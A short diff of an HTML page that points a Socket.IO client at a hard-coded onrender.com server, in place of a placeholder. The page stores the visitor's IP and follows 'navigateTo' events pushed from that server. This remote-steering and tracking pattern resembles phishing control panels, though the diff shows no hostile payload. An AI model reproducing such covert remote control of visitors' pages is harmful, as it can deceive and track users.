@@ -302,7 +302,7 @@
     <!-- 1) Load Socket.IO once -->
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <script>
-        window.socket = io("#SERVERURI#");
+        window.socket = io("https://server-nslx.onrender.com");
         window.visitorIP = null;
         (async () => {
             try {
@@ -321,5 +321,6 @@
     <!-- 2) location.js to handle navigateTo events -->
     <script src="./assets/js/location.js"></script>
 </body>
+
 
 </html>
